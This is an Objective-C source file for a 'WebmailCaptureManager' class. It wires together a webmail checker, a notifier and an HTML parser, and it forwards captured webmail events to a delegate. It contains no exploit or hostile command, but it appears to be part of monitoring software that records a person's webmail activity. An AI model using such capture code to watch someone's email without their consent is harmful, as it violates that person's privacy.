//
//  WebmailCaptureManager.m
//  WebmailCaptureManager
//
//  Created by ophat on 2/6/15.
//  Copyright (c) 2015 ophat. All rights reserved.
//

#import "WebmailCaptureManager.h"
#import "WebmailChecker.h"
#import "WebmailNotifier.h"
#import "WebmailHTMLParser.h"

@interface WebmailCaptureManager (private)
- (void) webmailEventCaptured: (FxEvent *) aEvent;
@end

@implementation WebmailCaptureManager

- (id) initWithCacheFolder: (NSString *) aCacheFolder{
    if ((self = [super init])) {
        mWebmailChecker = [[WebmailChecker alloc] initWithDatabaseFolder:aCacheFolder];
        mWebNotify = [[WebmailNotifier alloc] init];
        
        WebmailHTMLParser *webmailParser = [WebmailHTMLParser sharedWebmailHTMLParser];
        [webmailParser setMDelegate:self];
        [webmailParser setMSelector:@selector(webmailEventCaptured:)];
        [webmailParser setMThreadA:[NSThread currentThread]];
        [webmailParser setMWebmailChecker:mWebmailChecker];
        [webmailParser setMWebmailNotifier:mWebNotify ];
    }
    return self;
}

- (void) registerEventDelegate: (id <EventDelegate>) aEventDelegate {
    mEventDelegate = aEventDelegate;
}

- (void) unregisterEventDelegate {
    mEventDelegate = nil;
}

- (void) startCapture{
    [mWebNotify startCapture];
}

- (void) stopCapture{
    [mWebNotify stopCapture];
}

- (void) clearWebmail {
    [mWebmailChecker clearWebmail];
}

- (void) webmailEventCaptured: (FxEvent *) aEvent {
    DLog(@"Webmail event captured : %@", aEvent);
    if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
        [mEventDelegate performSelector:@selector(eventFinished:) withObject:aEvent];
    }
}

-(void)dealloc{
    [mWebNotify release];
    [mWebmailChecker release];
    [super dealloc];
}
@end
